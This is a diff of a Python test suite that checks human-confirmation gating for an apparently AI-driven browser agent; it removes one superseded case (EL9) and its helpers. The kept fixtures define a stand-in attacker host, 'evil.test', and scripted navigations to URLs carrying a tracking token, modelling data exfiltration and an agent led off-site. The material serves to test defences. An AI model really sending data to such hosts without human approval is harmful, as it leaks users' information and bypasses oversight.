@@ -1,5 +1,8 @@
 """Human-confirmation regression cases EL1 to EL10, plus EL8b and EL8c.
 
+EL9 is not here: amendment 2026-08-23e item 2 superseded it, and EM4 in
+tests/test_confirmation_nav.py is the case that replaced it.
+
 Driven through a real MCP client session over stdio, not through an internal
 call: an elicitation is a server-initiated request, so it only exists if it
 crosses the wire.  The client's ``elicitation_callback`` is scripted per case
@@ -38,7 +41,6 @@ EVIL_HOST = "evil.test"
 EVIL_Q = f"http://{EVIL_HOST}/q?id=7731"
 EVIL_DATASET = f"http://{EVIL_HOST}/dataset.csv"
 EVIL_OTHER = f"http://{EVIL_HOST}/other"
-EVIL_ROOT = f"http://{EVIL_HOST}/"
 
 #: Carries a distinctive token, so AgentLock's novel-lineage check has an
 #: authoritative baseline to classify a model-composed URL against.  Without
@@ -170,13 +172,6 @@ async def _el7_body(call: Any) -> None:
     await call("type", {"element_id": element_id, "value": "expenses"}, tag="gated")
 
 
-async def _el9_body(call: Any) -> None:
-    snap = await call("snapshot", {}, tag="setup")
-    link_id = _link_id(snap, EVIL_HOST)
-    await call("click", {"element_id": link_id}, tag="gated")
-    await call("navigate", {"url": EVIL_ROOT}, tag="second")
-
-
 async def _el10_body(call: Any) -> None:
     for n in range(1, 7):
         await call("navigate", {"url": f"http://{EVIL_HOST}/step-{n}?id=7731"},
@@ -192,13 +187,6 @@ def _field_id(snapshot: dict[str, Any], name: str) -> str:
         if name.lower() in blob:
             return element["id"]
     raise AssertionError(f"no textbox matching {name!r} in {snapshot}")
-
-
-def _link_id(snapshot: dict[str, Any], host: str) -> str:
-    for element in snapshot.get("elements", []):
-        if element.get("role") == "link" and host in element.get("href", ""):
-            return element["id"]
-    raise AssertionError(f"no link to {host!r} in {snapshot}")
 
 
 # -- the cases ------------------------------------------------------------
@@ -295,14 +283,6 @@ CASES: list[dict[str, Any]] = [
         "capabilities": CAP_MODES_UNSPECIFIED,
     },
     {
-        "case": "EL9",
-        "description": "click offsite, then navigate to the target it reported",
-        "fixture": "t4_escape.html",
-        "answers": ["allow_once"],
-        "body": _el9_body,
-        "capabilities": CAP_DEFAULT,
-    },
-    {
         "case": "EL10",
         "description": "six declines in one session; the sixth is not asked",
         "fixture": "index.html",
@@ -388,16 +368,11 @@ FROZEN: dict[str, dict[str, Any]] = {
         "final_url_host": EVIL_HOST,
         "evil_hit_paths": ["/q"],
     },
-    "EL9": {
-        "elicit_requests_logged": 1,
-        # A click carries no gate block of its own: the click is ungated and
-        # the navigation it caused is what the gate decided, so the denial is
-        # read off the `blocked` entry.
-        "gated": {"blocked_allowed": False, "blocked_target": EVIL_ROOT},
-        "second": {"allowed": True, "channel": "USER_CONFIRMED",
-                   "fail_open": False},
-        "evil_hit_paths": ["/"],
-    },
+    # EL9 is superseded by EM4 in tests/test_confirmation_nav.py. Amendment
+    # 2026-08-23e item 2 replaced item 8 of 2026-08-23b: an intercepted
+    # cross-origin navigation no longer only names its target for the model to
+    # re-request, it is put to the human inside the call that caused it. EL9
+    # measured the old two-call shape, so it is not restated here.
     "EL10": {
         "elicit_requests_logged": 5,
         "attempt6": {"allowed": False, "confirmation": "cap_reached",
@@ -414,28 +389,6 @@ def _gate_of(step: dict[str, Any]) -> dict[str, Any]:
         return {}
     gate = payload.get("gate")
     return gate if isinstance(gate, dict) else {}
-
-
-def _blocked_target(step: dict[str, Any]) -> str:
-    payload = step.get("result")
-    if not isinstance(payload, dict):
-        return ""
-    for entry in payload.get("blocked", []) or []:
-        target = entry.get("target", "")
-        if target:
-            return str(target)
-    return ""
-
-
-def _blocked_allowed(step: dict[str, Any]) -> bool | None:
-    """`allowed` on the first blocked navigation a step reported, if any."""
-    payload = step.get("result")
-    if not isinstance(payload, dict):
-        return None
-    blocked = payload.get("blocked") or []
-    if not blocked:
-        return None
-    return bool(blocked[0].get("allowed"))
 
 
 def _check(case: str, observed: dict[str, Any]) -> list[str]:
@@ -467,12 +420,9 @@ def _check(case: str, observed: dict[str, Any]) -> list[str]:
             continue
         gate = _gate_of(step)
         for field, want in frozen[tag].items():
-            if field == "blocked_target":
-                got: Any = _blocked_target(step)
-            elif field == "blocked_allowed":
-                got = _blocked_allowed(step)
-            else:
-                got = gate.get(field)
+            # The `blocked` readers EL9 needed went with it: every remaining
+            # case here is judged on the gate block of its own tool result.
+            got = gate.get(field)
             if got != want:
                 diffs.append(
                     f"{tag}.{field}: frozen {want!r}, observed {got!r}"
